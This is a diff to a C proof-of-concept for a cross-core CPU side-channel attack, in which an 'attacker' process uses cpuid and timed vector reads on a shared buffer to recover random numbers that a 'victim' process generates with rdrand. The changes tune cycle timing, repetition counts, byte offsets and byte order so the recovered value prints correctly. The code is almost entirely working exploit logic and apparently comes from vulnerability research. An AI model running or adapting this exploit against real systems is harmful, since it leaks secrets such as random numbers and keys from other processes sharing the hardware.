@@ -11,20 +11,19 @@
 #include "utils.h"
 
 
-
+#define CYCLE_LENGTH 5000000
 
 
 
 void victim(int cpu, int reps, void *mem){
     set_processor_affinity(cpu);
     while(reps--){
-        usleep(2000000);
+        usleep(CYCLE_LENGTH);
         uint64_t random_number;
         asm volatile("rdrand %0":"=r"(random_number):);
-        //printf("[VICTIM] Generated Random Number 0x%16lx\n", random_number);
+        printf("[VICTIM]   Generated Random Number 0x%16lx\n", random_number);
         //fflush(stdout);
     }
-
     while(1);
 }
 
@@ -35,7 +34,8 @@ void attacker(int reps){
     memset(mem, 0xFF, _page_size * 256);
     char staging_buffer[65];
     staging_buffer[64] = 0;
-    while(1){
+
+    while(reps--){
         asm volatile(
         "mov $0x80000004, %%eax\n"
         "cpuid\n"
@@ -43,14 +43,12 @@ void attacker(int reps){
         :::"eax");
         while (!rdrand_section_changed(mem, byte_32)){}
         uint64_t random_number = 0;
-        vector_read(mem, REPS, staging_buffer, 0, 64, 1);
+        vector_read(mem, REPS*3, staging_buffer, 32, 40, 0);
         for(int i = 0; i < 8; i++) {
             random_number = random_number << 8;
-            random_number += staging_buffer[32 + i];
+            random_number += staging_buffer[32 + (8 - i - 1)];
         }
-        //printf("[ATTACKER] Recovered Random Number 0x%16lx\n", random_number);
-        //staging_buffer[40] = 0;
-        printf("%s\n", staging_buffer);
+        printf("[ATTACKER] Recovered Random Number 0x%16lx\n", random_number);
         fflush(stdout);
     }
     munmap(mem-1, _page_size * 257);
@@ -74,8 +72,8 @@ int main(int argc, char **args) {
     pid = fork();
     if (!pid) victim_cpuid(0x80000002ul, writer_cpu);
     pid2 = fork();
-    if(!pid2) victim(offcore_cpu, 5, mem);
-    attacker(5);
+    if(!pid2) victim(offcore_cpu, 50, mem);
+    attacker(50);
     kill(pid2, SIGKILL);
     kill(pid, SIGKILL);
     munmap(mem-1, _page_size * 257);
